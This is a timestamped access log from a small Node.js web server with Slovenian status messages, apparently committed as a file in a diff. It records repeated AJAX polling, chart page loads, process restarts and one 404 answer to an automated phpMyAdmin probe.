+2017-04-25T07:39:35.472Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=972244.6578541901
+2017-04-25T07:39:38.473Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=113692.29729225273
+2017-04-25T07:39:41.474Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=38164.12467126895
+2017-04-25T07:39:44.475Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=661647.8293828536
+2017-04-25T07:39:47.476Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=311933.37780634046
+2017-04-25T07:39:50.477Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=492364.4431347873
+2017-04-25T07:39:53.489Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=987431.1881824924
+2017-04-25T07:39:56.483Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=145689.87835472514
+2017-04-25T07:39:59.498Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=478452.48282366514
+2017-04-25T07:40:02.503Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=279634.1273791014
+2017-04-25T07:40:05.491Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=227214.76292095822
+2017-04-25T07:40:08.482Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=800496.3570029469
+2017-04-25T07:40:11.482Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=788767.4180664098
+2017-04-25T07:40:14.483Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=866072.4024888868
+2017-04-25T07:40:17.484Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=620944.1649806282
+2017-04-25T07:40:20.486Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=844333.6670687828
+2017-04-25T07:40:23.705Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=754022.3053298462
+2017-04-25T07:40:26.517Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=72654.28901601667
+2017-04-25T07:40:29.487Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=64808.8737347583
+2017-04-25T07:40:32.489Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=566791.3613488482
+2017-04-25T07:40:35.493Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=114012.78041914864
+2017-04-25T07:40:38.491Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=749106.6106576956
+2017-04-25T07:40:41.492Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=310345.1548307461
+2017-04-25T07:40:44.492Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=370341.81586541346
+2017-04-25T07:40:47.493Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=305208.293582395
+2017-04-25T07:40:50.494Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=457729.2748926729
+Streznik tece na http://192.168.2.9 oz http://193.77.211.143
+2017-04-25T07:41:53.685Z Incoming Request from: 93.103.1.23 for href: /
+2017-04-25T07:41:55.134Z Incoming Request from: 93.103.1.23 for href: /canvas3d.js
+2017-04-25T07:41:55.152Z Incoming Request from: 93.103.1.23 for href: /spremeni.js
+2017-04-25T07:41:55.293Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=970161.3704533607
+2017-04-25T07:41:55.465Z Incoming Request from: 93.103.1.23 for href: /favicon.ico
+2017-04-25T07:43:38.569Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=145094.4798802416
+2017-04-25T07:43:41.513Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=593415.0878190363
+2017-04-25T07:43:44.678Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=385664.8710377404
+2017-04-25T07:43:47.525Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=709270.6957921297
+2017-04-25T07:43:50.506Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=259260.1700226962
+2017-04-25T07:43:53.506Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=608518.9530591418
+2017-04-25T07:43:56.507Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=578362.2353696929
+2017-04-25T07:43:59.522Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=811484.8301933584
+2017-04-25T07:44:02.510Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=791130.9697039397
+2017-04-25T07:44:05.525Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=349219.21927912394
+2017-04-25T07:44:08.512Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=877151.6310800684
+2017-04-25T07:44:11.514Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=402885.66105599765
+2017-04-25T07:44:14.707Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=400581.34743077646
+2017-04-25T07:44:17.516Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=7825.8515543287995
+2017-04-25T07:44:20.517Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=260195.05820924204
+2017-04-25T07:44:23.518Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=145546.0338767134
+2017-04-25T07:44:26.519Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=647057.2053297694
+2017-04-25T07:44:29.520Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=276749.9996967142
+2017-04-25T07:44:32.521Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=89410.61012701956
+2017-04-25T07:44:35.524Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=71412.59079458418
+2017-04-25T07:44:38.524Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=970872.6419514641
+2017-04-25T07:44:41.524Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=542502.2104376485
+2017-04-25T07:44:44.526Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=154373.44939477794
+2017-04-25T07:44:47.527Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=190833.87426548693
+2017-04-25T07:44:50.527Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=947129.1279678729
+2017-04-25T07:44:53.529Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=945898.9733367475
+2017-04-25T07:44:56.530Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=346847.27028251294
+2017-04-25T07:44:59.530Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=69012.1550481555
+2017-04-25T07:45:02.531Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=42579.50889719764
+2017-04-25T07:45:05.533Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=139354.81451771926
+2017-04-25T07:45:08.533Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=859534.6510871635
+2017-04-25T07:45:11.534Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=932935.2740796299
+2017-04-25T07:45:14.611Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=157138.57652518005
+2017-04-25T07:45:17.537Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=508897.45760861406
+2017-04-25T07:45:20.537Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=768279.5046604393
+2017-04-25T07:45:23.539Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=896511.6013089629
+2017-04-25T07:45:26.540Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=846144.2652418008
+2017-04-25T07:45:29.541Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=457436.6238780019
+2017-04-25T07:45:32.542Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=602293.3117195959
+2017-04-25T07:45:35.807Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=955703.4155027857
+2017-04-25T07:45:38.546Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=196711.15510290037
+2017-04-25T07:45:41.553Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=412077.0819357611
+2017-04-25T07:45:44.548Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=962676.8540574666
+2017-04-25T07:45:47.550Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=585651.5202416864
+2017-04-25T07:45:50.550Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=642656.448533107
+2017-04-25T07:45:53.631Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=85284.71440676055
+2017-04-25T07:45:56.564Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=373099.7986230322
+2017-04-25T07:45:59.555Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=948951.9078162323
+2017-04-25T07:46:02.561Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=622269.2749252631
+2017-04-25T07:52:18.406Z Incoming Request from: 93.103.1.23 for href: /
+2017-04-25T07:52:18.613Z Incoming Request from: 93.103.1.23 for href: /canvas3d.js
+2017-04-25T07:52:18.634Z Incoming Request from: 93.103.1.23 for href: /spremeni.js
+2017-04-25T07:52:18.876Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=804540.9054186117
+2017-04-25T07:52:19.077Z Incoming Request from: 93.103.1.23 for href: /favicon.ico
+2017-04-25T07:52:21.878Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=606508.8503236007
+2017-04-25T07:52:24.878Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=148085.1654130757
+2017-04-25T07:52:27.902Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=970884.4621111763
+2017-04-25T07:52:31.129Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T07:52:31.258Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T07:52:31.534Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=886751.2865197435
+2017-04-25T07:52:31.626Z Incoming Request from: 93.103.1.23 for href: /chart&nocache=749175.9302588501
+2017-04-25T07:52:35.535Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=637738.2016686377
+2017-04-25T07:52:39.534Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=74573.83443052246
+2017-04-25T07:52:43.534Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=829306.9130632586
+2017-04-25T07:52:47.534Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=887905.463657309
+2017-04-25T07:52:51.536Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=309900.67264312174
+2017-04-25T07:52:55.554Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=739744.3445878195
+2017-04-25T07:52:59.535Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=642945.4422330341
+2017-04-25T07:53:02.535Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=792488.5761389727
+2017-04-25T07:53:06.602Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=991649.3007427006
+2017-04-25T07:53:10.590Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=308884.84343811707
+2017-04-25T07:53:13.552Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=412290.6222303402
+2017-04-25T07:53:17.534Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=399341.19848945015
+2017-04-25T07:53:20.533Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=398547.2112297193
+2017-04-25T07:53:24.606Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=384079.8568134556
+2017-04-25T07:53:28.532Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=425574.9645579725
+2017-04-25T07:53:32.534Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=240506.16559146688
+2017-04-25T07:53:35.534Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=69083.00817401835
+2017-04-25T07:53:39.533Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=383067.52875875373
+2017-04-25T07:53:43.654Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=404454.2218427585
+2017-04-25T07:53:46.535Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=899077.639972434
+2017-04-25T07:53:49.535Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=589894.4391336087
+2017-04-25T07:53:53.532Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=464987.5490998203
+2017-04-25T07:53:56.540Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=46409.571642363364
+2017-04-25T07:54:00.532Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=715048.2087099317
+2017-04-25T07:54:04.532Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=84312.7555943055
+2017-04-25T07:54:08.531Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=130913.03064730919
+2017-04-25T07:54:12.532Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=975841.9789673083
+2017-04-25T07:54:16.532Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=354338.4686372113
+2017-04-25T07:54:19.532Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=807481.2393145065
+2017-04-25T07:54:23.550Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=693444.763898966
+2017-04-25T07:54:26.532Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=288136.1818689452
+2017-04-25T07:54:30.533Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=282595.5388045291
+2017-04-25T07:54:34.534Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=947989.3380815565
+2017-04-25T07:54:38.533Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=605491.6329349736
+2017-04-25T07:54:42.531Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=978560.0094589782
+2017-04-25T07:54:45.533Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=657386.5135230384
+2017-04-25T07:54:49.532Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=877675.8071432813
+2017-04-25T07:54:53.624Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=581537.7699045923
+2017-04-25T07:54:57.532Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=107677.85636686833
+2017-04-25T07:55:01.532Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=322306.84377962747
+2017-04-25T07:55:05.531Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=389144.96567792643
+2017-04-25T07:55:08.532Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=3161.4377337614296
+2017-04-25T07:55:12.536Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=903878.4177620944
+2017-04-25T07:55:16.534Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=630637.6995386527
+2017-04-25T07:55:20.532Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=553871.6186631061
+2017-04-25T08:04:26.874Z Incoming Request from: 191.96.249.97 for href: /phpmyadmin/scripts/setup.php
+pošiljam 404 Error: ENOENT, open '/root/phpmyadmin'
+2017-04-25T09:54:33.011Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T09:54:34.102Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T09:54:34.765Z Incoming Request from: 93.103.1.23 for href: /chart&nocache=160079.75644390294
+2017-04-25T09:54:35.123Z Incoming Request from: 93.103.1.23 for href: /favicon.ico
+error: Forever detected script was killed by signal: SIGKILL
+error: Script restart attempt #1
+Streznik tece na http://192.168.2.9 oz http://193.77.211.143
+2017-04-25T10:26:09.081Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T10:26:09.552Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T10:26:10.016Z Incoming Request from: 93.103.1.23 for href: /chart&nocache=870186.3314088527
+2017-04-25T10:26:10.385Z Incoming Request from: 93.103.1.23 for href: /favicon.ico
+2017-04-25T10:26:16.628Z Incoming Request from: 93.103.1.23 for href: /
+2017-04-25T10:26:17.185Z Incoming Request from: 93.103.1.23 for href: /canvas3d.js
+2017-04-25T10:26:17.195Z Incoming Request from: 93.103.1.23 for href: /spremeni.js
+2017-04-25T10:26:17.423Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=882912.6047466908
+2017-04-25T10:26:17.618Z Incoming Request from: 93.103.1.23 for href: /favicon.ico
+2017-04-25T10:26:20.450Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=105275.5539654413
+2017-04-25T10:26:23.423Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=950471.1921503552
+2017-04-25T10:26:26.424Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=438813.7528587763
+2017-04-25T10:26:29.426Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=6388.248261357088
+2017-04-25T10:26:32.427Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=642248.9788825578
+2017-04-25T10:26:35.678Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=685930.9590153766
+2017-04-25T10:26:38.430Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=290618.56878447667
+2017-04-25T10:26:41.430Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=845270.7999385837
+2017-04-25T10:26:44.431Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=408303.2736559797
+2017-04-25T10:26:47.433Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=927079.3039335264
+2017-04-25T10:26:50.436Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=580058.8093688209
+2017-04-25T10:26:53.435Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=537348.1319859343
+2017-04-25T10:26:56.435Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=871596.2188310302
+2017-04-25T10:26:59.436Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=32383.835240910706
+2017-04-25T10:27:02.438Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=72941.77028046956
+2017-04-25T10:27:05.439Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=381874.493294843
+2017-04-25T10:27:08.442Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=502065.27858343854
+2017-04-25T10:27:11.442Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=252444.3690504683
+2017-04-25T10:27:14.443Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=812455.0492676721
+2017-04-25T10:27:17.445Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=397631.8311498712
+2017-04-25T10:27:20.446Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=963668.1506906089
+2017-04-25T10:27:23.446Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=534706.1341089101
+2017-04-25T10:27:26.447Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=978906.1000967156
+2017-04-25T10:27:29.450Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=69999.02266495739
+2017-04-25T10:27:32.449Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=493813.79950368754
+2017-04-25T10:27:35.579Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=363526.70403884014
+2017-04-25T10:27:38.451Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=354979.5743546627
+2017-04-25T10:27:41.454Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=866055.3550322918
+2017-04-25T10:27:44.455Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=871246.5025676794
+2017-04-25T10:27:47.455Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=508444.72863483103
+2017-04-25T10:27:50.456Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=254400.2991324066
+2017-04-25T10:27:53.456Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=910683.9690643334
+2017-04-25T10:27:56.458Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=674448.4889673952
+2017-04-25T10:27:59.460Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=842519.188906373
+2017-04-25T10:28:02.460Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=467948.94550900115
+2017-04-25T10:28:05.688Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=165880.6225017031
+2017-04-25T10:28:08.462Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=208435.95274519068
+2017-04-25T10:28:11.462Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=344267.160964242
+2017-04-25T10:28:14.464Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=697430.9141625888
+2017-04-25T10:28:17.466Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=729940.8138835662
+2017-04-25T10:28:20.466Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=888164.0068435299
+2017-04-25T10:28:23.468Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=920210.3879479949
+2017-04-25T10:28:26.573Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=444898.90712646
+2017-04-25T10:28:29.471Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=262179.1664443853
+2017-04-25T10:28:32.473Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=26012.679816174168
+2017-04-25T10:28:35.473Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=296274.0083936681
+2017-04-25T10:28:38.475Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=505738.76224549586
+2017-04-25T10:28:41.477Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=228379.011527702
+2017-04-25T10:28:44.702Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=771955.255846337
+Streznik tece na http://192.168.2.9 oz http://193.77.211.143
+2017-04-25T10:35:00.323Z Incoming Request from: 93.103.1.23 for href: /
+2017-04-25T10:35:01.414Z Incoming Request from: 93.103.1.23 for href: /canvas3d.js
+2017-04-25T10:35:01.509Z Incoming Request from: 93.103.1.23 for href: /spremeni.js
+2017-04-25T10:35:01.634Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=531936.0117465943
+2017-04-25T10:35:01.827Z Incoming Request from: 93.103.1.23 for href: /favicon.ico
+2017-04-25T10:35:04.642Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=964431.3729200913
+2017-04-25T10:35:07.633Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=365959.3080571053
+2017-04-25T10:35:10.634Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=36744.785199190665
+2017-04-25T10:35:13.639Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=464573.98394925776
+2017-04-25T10:35:16.636Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=376999.5030862501
+2017-04-25T10:35:19.638Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=906961.3196672421
+2017-04-25T10:35:22.712Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=171032.10155634518
+2017-04-25T10:35:25.640Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=463391.7127658997
+2017-04-25T10:35:28.640Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=567145.6788492769
+2017-04-25T10:35:31.641Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=379254.5305165462
+2017-04-25T10:35:34.811Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=610380.0170927041
+2017-04-25T10:35:37.644Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=385390.7701286263
+2017-04-25T10:35:40.643Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=747125.861516723
+2017-04-25T10:35:43.644Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=163554.75047743728
+2017-04-25T10:35:46.645Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=885813.4083307112
+2017-04-25T10:35:49.850Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=967454.8796630307
+2017-04-25T10:35:52.649Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=269735.4489081132
+2017-04-25T10:35:56.621Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=72883.45659032247
+2017-04-25T10:35:56.812Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T10:35:57.063Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T10:35:57.427Z Incoming Request from: 93.103.1.23 for href: /chart&nocache=592476.2825575196
+2017-04-25T10:35:59.528Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=933798.537345448
+2017-04-25T10:36:03.527Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=711130.363336603
+2017-04-25T10:36:07.528Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=215372.67514022897
+2017-04-25T10:36:11.528Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=769479.841533986
+2017-04-25T10:36:14.530Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=766995.8854488714
+2017-04-25T10:36:17.533Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=648424.9049162938
+2017-04-25T10:36:20.533Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=78504.89593316268
+2017-04-25T10:36:23.534Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=782046.3074559758
+2017-04-25T10:36:26.535Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=849570.1708782124
+2017-04-25T10:36:29.536Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=407842.43658815656
+2017-04-25T10:36:32.538Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=752734.4429566012
+2017-04-25T10:36:35.636Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=737389.3414228669
+2017-04-25T10:36:38.539Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=869660.09868342
+2017-04-25T10:36:41.548Z Incoming Request from: 93.103.1.23 for href: /ajaxtle&nocache=369317.0863468851
+2017-04-25T12:02:41.257Z Incoming Request from: 141.212.122.48 for href: /
+2017-04-25T12:16:10.543Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T12:16:10.629Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T12:16:11.135Z Incoming Request from: 93.103.1.23 for href: /chart&undefined&nocache=82288.57281044322
+2017-04-25T12:16:11.714Z Incoming Request from: 93.103.1.23 for href: /chart&undefined&nocache=597359.3137405162
+2017-04-25T12:16:11.787Z Incoming Request from: 93.103.1.23 for href: /chart&undefined&nocache=183618.523620523
+2017-04-25T12:16:12.474Z Incoming Request from: 93.103.1.23 for href: /chart&d&nocache=347874.49222204334
+2017-04-25T12:17:02.819Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T12:17:02.926Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T12:17:03.335Z Incoming Request from: 93.103.1.23 for href: /chart&d&nocache=672909.4412400742
+2017-04-25T12:17:03.358Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=207274.98079002937
+2017-04-25T12:17:03.393Z Incoming Request from: 93.103.1.23 for href: /chart&m&nocache=452824.99879691994
+2017-04-25T12:17:03.438Z Incoming Request from: 93.103.1.23 for href: /chart&d&nocache=492588.4284706676
+2017-04-25T12:20:09.482Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T12:20:09.571Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T12:20:09.938Z Incoming Request from: 93.103.1.23 for href: /chart&d&nocache=306375.1725867394
+2017-04-25T12:20:09.989Z Incoming Request from: 93.103.1.23 for href: /chart&m&nocache=323526.6815108868
+2017-04-25T12:20:10.566Z Incoming Request from: 93.103.1.23 for href: /chart&d&nocache=454610.879281637
+2017-04-25T12:20:21.790Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=651127.757548273
+2017-04-25T12:20:28.352Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=12940.51960403686
+2017-04-25T12:20:30.000Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=752240.1364498828
+2017-04-25T12:20:31.900Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=258627.59135083825
+2017-04-25T12:21:48.403Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T12:21:48.500Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T12:21:48.930Z Incoming Request from: 93.103.1.23 for href: /chart&d&nocache=270936.83957604744
+2017-04-25T12:21:53.432Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=319505.6706438311
+2017-04-25T12:22:05.920Z Incoming Request from: 93.103.1.23 for href: /chart&m&nocache=516782.4584123171
+2017-04-25T12:22:07.358Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=94411.5085642443
+error: Forever detected script was killed by signal: SIGKILL
+error: Script restart attempt #1
+Streznik tece na http://192.168.2.9 oz http://193.77.211.143
+2017-04-25T12:26:36.308Z Incoming Request from: 93.103.1.23 for href: /graf
